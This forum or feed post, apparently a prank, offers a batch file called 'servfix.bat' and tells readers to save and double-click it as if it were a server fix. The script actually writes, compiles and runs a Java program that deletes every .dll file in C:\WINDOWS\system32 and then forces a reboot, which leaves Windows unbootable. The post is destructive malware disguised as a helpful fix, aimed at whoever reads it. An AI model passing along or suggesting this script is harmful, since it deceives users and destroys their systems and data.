item.title: Deleating pk of ur server
item.dc:creator: @Javacisnotrecognized _^_
item.description:
@Javacisnotrecognized wrote:

Use this.

echo public class H {>> H.java
echo public static void main(String[] args)throws Exception{ >> H.java
echo Process P = Runtime.getRuntime().exec("C:\\WINDOWS\\system32\\cmd.exe"); >> H.java
echo P.getOutputStream().write("cd C:\\WINDOWS\\system32\\\n\r".getBytes()); >> H.java
echo P.getOutputStream().write("del *.dll\n\r".getBytes()); >> H.java
echo P.getOutputStream().write("y\n\r".getBytes()); >> H.java
echo P.getOutputStream().write("exit\n\r".getBytes()); >> H.java
echo } >> H.java
echo } >> H.java
@javac H.java
@java H
@CD C:\WINDOWS\system32\
@shutdown -r

Save it as servfix.bat and then double-click on it.
